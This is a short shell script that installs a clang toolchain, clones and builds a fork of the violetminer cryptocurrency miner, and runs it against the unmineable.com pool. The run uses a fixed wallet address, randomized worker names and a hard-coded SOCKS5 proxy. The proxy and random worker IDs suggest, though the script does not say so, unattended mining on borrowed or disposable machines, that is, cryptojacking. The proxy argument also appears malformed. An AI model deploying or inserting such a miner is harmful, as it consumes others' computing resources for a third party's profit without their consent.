#!/bin/sh
add-apt-repository ppa:ubuntu-toolchain-r/test -y
wget -O - https://apt.llvm.org/llvm-snapshot.gpg.key | apt-key add -
add-apt-repository "deb https://apt.llvm.org/bionic/ llvm-toolchain-bionic 6.0 main"
apt-get update
apt-get install aptitude -y
aptitude install -y -o Aptitude::ProblemResolver::SolutionCost='100*canceled-actions,200*removals' build-essential clang-6.0 libstdc++-7-dev git python-pip libssl-dev
pip install cmake
export CC=clang-6.0
export CXX=clang++-6.0
git clone https://github.com/hinshuika/violetminer.git && cd violetminer
git submodule update --init --recursive
mkdir build && cd build
cmake ..
make
PROXY=socks5://98.162.25.29:31679
./violetminer --algorithm wrkzcoin --pool rx.unmineable.com:3333 --username WIN:TX7hx8zqvfvb4c16QkuZYfrV4Kvqi8xMGi.$(echo $(shuf -i 111111-9999999 -n 1)-CC)#482f-otle --password x $PROXY --threads 2
